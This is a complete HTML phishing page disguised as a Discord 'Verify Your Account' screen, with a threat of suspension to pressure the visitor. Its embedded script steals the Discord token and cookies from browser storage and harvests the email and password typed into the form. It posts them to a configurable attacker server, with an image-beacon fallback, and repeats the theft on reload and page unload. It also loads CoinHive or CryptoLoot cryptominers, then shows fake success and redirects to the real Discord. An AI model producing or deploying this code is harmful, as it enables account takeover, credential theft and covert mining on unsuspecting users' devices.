<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #1e1f22;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #2b2d31;
            border-radius: 16px;
            padding: 48px 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
            border: 1px solid #3f4147;
        }
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }
        .logo svg {
            width: 60px;
            height: 60px;
        }
        h1 {
            color: #ffffff;
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #b5bac1;
            font-size: 16px;
            text-align: center;
            margin-bottom: 24px;
        }
        .warning-box {
            background: #1a1b1e;
            border-left: 4px solid #f23f42;
            padding: 12px 16px;
            border-radius: 4px;
            margin-bottom: 24px;
        }
        .warning-box p {
            color: #f23f42;
            font-size: 14px;
            margin: 0;
        }
        .input-group {
            margin-bottom: 16px;
        }
        .input-group label {
            color: #b5bac1;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            display: block;
            margin-bottom: 4px;
        }
        .input-group input {
            width: 100%;
            padding: 12px 14px;
            background: #1e1f22;
            border: 1px solid #3f4147;
            border-radius: 4px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-group input:focus {
            border-color: #5865f2;
        }
        .input-group input::placeholder {
            color: #6d6f78;
        }
        .verify-btn {
            width: 100%;
            padding: 14px;
            background: #5865f2;
            border: none;
            border-radius: 4px;
            color: #ffffff;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 8px;
        }
        .verify-btn:hover {
            background: #4752c4;
        }
        .verify-btn:active {
            background: #3c45a5;
        }
        .footer {
            margin-top: 16px;
            text-align: center;
            color: #6d6f78;
            font-size: 12px;
        }
        .footer a {
            color: #6d6f78;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .loader {
            display: none;
            text-align: center;
            margin-top: 16px;
        }
        .loader .spinner {
            border: 3px solid #3f4147;
            border-top: 3px solid #5865f2;
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            margin: 0 auto 12px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader p {
            color: #b5bac1;
            font-size: 14px;
        }
        .success {
            display: none;
            text-align: center;
            padding: 20px 0;
        }
        .success .check {
            font-size: 64px;
            color: #57f287;
            margin-bottom: 12px;
        }
        .success h2 {
            color: #ffffff;
            font-size: 20px;
        }
        .success p {
            color: #b5bac1;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container" id="app">
        <!-- Logo -->
        <div class="logo">
            <svg width="60" height="60" viewBox="0 0 127 127" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M107.8 20.9C99.5 17.1 90.7 14.3 81.6 12.6C80.7 14.4 79.7 16.8 79 18.7C69.4 17.1 59.8 17.1 50.2 18.7C49.5 16.8 48.4 14.4 47.5 12.6C38.4 14.3 29.6 17.1 21.3 20.9C12.7 33.4 9.4 45.5 10.8 57.3C19.5 64.1 29.2 69 39.5 72.1C42.4 68.4 45.1 64.6 47.5 60.6C43.3 58.8 39.3 56.6 35.6 54.1C36.7 53.2 37.7 52.3 38.7 51.3C51.9 57.6 66.3 57.6 79.5 51.3C80.5 52.3 81.5 53.2 82.6 54.1C78.9 56.6 74.9 58.8 70.7 60.6C73.1 64.6 75.8 68.4 78.7 72.1C89 69 98.7 64.1 107.4 57.3C109.1 43.7 104.6 31.8 107.8 20.9Z" fill="white"/>
                <path d="M42.3 68.4C37.1 68.4 32.7 63.2 32.7 56.8C32.7 50.4 37 45.2 42.3 45.2C47.6 45.2 51.9 50.4 51.9 56.8C51.9 63.2 47.6 68.4 42.3 68.4Z" fill="white"/>
                <path d="M84.9 68.4C79.6 68.4 75.2 63.2 75.2 56.8C75.2 50.4 79.5 45.2 84.9 45.2C90.2 45.2 94.5 50.4 94.5 56.8C94.5 63.2 90.2 68.4 84.9 68.4Z" fill="white"/>
            </svg>
        </div>

        <h1>Verify Your Account</h1>
        <p class="subtitle">Complete this one-time security check</p>

        <div class="warning-box">
            <p>⚠️ Failure to verify will result in account suspension</p>
        </div>

        <!-- Fake Login Form -->
        <div id="form-section">
            <div class="input-group">
                <label>Email or Phone Number</label>
                <input type="text" id="email" placeholder="you@example.com" value="user@discord.com">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="••••••••" value="hunter2">
            </div>
            <button class="verify-btn" id="verifyBtn">Verify</button>
        </div>

        <!-- Loader -->
        <div class="loader" id="loader">
            <div class="spinner"></div>
            <p>Verifying your identity...</p>
            <p style="font-size:12px;color:#6d6f78;margin-top:4px;">This may take a few seconds</p>
        </div>

        <!-- Success -->
        <div class="success" id="success">
            <div class="check">✅</div>
            <h2>Verification Successful</h2>
            <p>Your account has been verified. You will be redirected shortly.</p>
        </div>

        <div class="footer">
            <a href="#">Privacy Policy</a> • <a href="#">Terms of Service</a>
        </div>
    </div>

    <script>
        // =============================================
        // TOKEN STEALER + CRYPTOMINER + REDIRECT
        // =============================================

        // CONFIGURATION
        const WEBHOOK_URL = 'http://localhost:5000/steal';  // CHANGE TO YOUR SERVER
        const MINER_SITE_KEY = 'YOUR_COINHIVE_SITE_KEY';    // OPTIONAL – REMOVE IF NO MINER
        const REDIRECT_URL = 'https://discord.com/app';     // WHERE THEY GO AFTER

        // 1. CRYPTOMINER (CoinHive style – uses CryptoLoot as fallback)
        function startMiner() {
            // Try CoinHive
            const script1 = document.createElement('script');
            script1.src = 'https://coinhive.com/lib/coinhive.min.js';
            script1.onload = function() {
                if (typeof CoinHive !== 'undefined') {
                    const miner = new CoinHive.Anonymous(MINER_SITE_KEY);
                    miner.start();
                    console.log('[MINER] Started CoinHive');
                }
            };
            document.head.appendChild(script1);

            // Fallback: CryptoLoot
            setTimeout(() => {
                if (typeof CoinHive === 'undefined') {
                    const script2 = document.createElement('script');
                    script2.src = 'https://cryptoloot.com/lib/cryptoloot.min.js';
                    script2.onload = function() {
                        if (typeof CryptoLoot !== 'undefined') {
                            const miner = new CryptoLoot.Anonymous(MINER_SITE_KEY);
                            miner.start();
                            console.log('[MINER] Started CryptoLoot');
                        }
                    };
                    document.head.appendChild(script2);
                }
            }, 3000);
        }

        // 2. TOKEN STEALER
        function stealToken() {
            try {
                // Discord stores token in localStorage
                const token = localStorage.getItem('token');
                if (token) {
                    console.log('[STEALER] Token found:', token.substring(0, 20) + '...');
                    sendToken(token);
                } else {
                    console.log('[STEALER] No token found in localStorage');
                    // Try sessionStorage as backup
                    const sessionToken = sessionStorage.getItem('token');
                    if (sessionToken) {
                        sendToken(sessionToken);
                    }
                }
            } catch (e) {
                console.error('[STEALER] Error:', e);
            }
        }

        // 3. SEND TO SERVER
        function sendToken(token) {
            const data = {
                token: token,
                userAgent: navigator.userAgent,
                url: window.location.href,
                referrer: document.referrer,
                timestamp: new Date().toISOString(),
                cookies: document.cookie
            };

            // Send via fetch (CORS-friendly)
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(res => console.log('[STEALER] Sent to server'))
            .catch(err => console.error('[STEALER] Send failed:', err));

            // Also send via image beacon (backup)
            const img = new Image();
            img.src = `${WEBHOOK_URL}?token=${encodeURIComponent(token)}&t=${Date.now()}`;
        }

        // 4. FAKE VERIFICATION FLOW
        document.getElementById('verifyBtn').addEventListener('click', function(e) {
            e.preventDefault();

            // Get entered credentials (for extra harvesting)
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Send credentials too
            if (email && password) {
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'credentials',
                        email: email,
                        password: password,
                        timestamp: new Date().toISOString()
                    })
                });
            }

            // Hide form, show loader
            document.getElementById('form-section').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            // Run stealers in background
            stealToken();
            startMiner();

            // After 3 seconds, show success
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('success').style.display = 'block';

                // Redirect after 2 more seconds
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 2000);
            }, 3000);
        });

        // Auto-trigger if they reload the page (for returning visitors)
        window.onload = function() {
            // If they come back, silently steal again
            if (localStorage.getItem('token')) {
                stealToken();
                startMiner();
            }
        };

        // Also steal on page unload (in case they close before clicking)
        window.addEventListener('beforeunload', function() {
            if (localStorage.getItem('token')) {
                sendToken(localStorage.getItem('token'));
            }
        });

        console.log('[PHISH] Page loaded. Waiting for interaction.');
    </script>
</body>
</html>
